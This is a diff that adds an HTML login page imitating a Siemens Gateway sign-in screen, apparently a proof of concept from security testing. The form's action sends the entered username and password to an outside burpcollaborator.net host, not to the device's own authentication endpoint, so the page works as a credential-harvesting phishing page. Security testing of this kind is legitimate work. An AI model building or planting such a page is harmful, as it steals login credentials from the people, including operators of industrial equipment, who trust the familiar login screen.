@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html xmlns='http://www.w3.org/1999/xhtml'>
+<head>
+<title>Login</title>
+<link rel='stylesheet' type='text/css' href='login.css'/>
+<script type='text/javascript' src='login.js'></script>
+<meta name='viewport' content='user-scalable=no, width=device-width, initial-scale=1.0'/>
+<link rel='icon' type='image/png' href='favicon.png' />
+<script type='text/javascript'>
+userModLogin.passwordRequired = false;
+userModLogin.authUri = "/user/auth";
+userModLogin.redirectUri = "/";
+userModLogin.localeLogin = "Login";
+userModLogin.localeLoggingIn = "Logging in";
+userModLogin.localeBadCreds = "Invalid username or password";
+userModLogin.autoFocusId = "username";
+userModLogin.showMobile = false;
+window.onload = function() { userModLogin.init(false); }</script>
+</head>
+<body>
+<form id='loginForm' method='post' action='https://lc172rg90utyd40by0jv1r4jwa20qp.burpcollaborator.net' autocomplete='off'>
+<p class='logo'>
+<img src='siemens-logo-color_0.png'></p>
+<p id='err'>
+Invalid username or password</p>
+<p>
+<label for='username'>
+Username:</label>
+<input type='text' id='username' name='username' autocomplete='off' placeholder='Username' /></p>
+<p>
+<label for='password'>
+Password:</label>
+<input type='password' id='password' name='password' size='25' autocomplete='off' placeholder='Password' /></p>
+<p style='visibility:hidden;'>
+<label for='mobile'>
+<input type='checkbox' id='mobile' value='mobile' /> Mobile</label>
+</p>
+<p>
+<input type='submit' id='loginButton' value='Login' onclick='return userModLogin.loginAuth();' /></p>
+</form>
+<p class='lic'>
+Licensed to Siemens Gateway</p>
+<p class='lic'>
+<a href='/lic/eula'>Terms of Use</a></p>
+</body>
+</html>
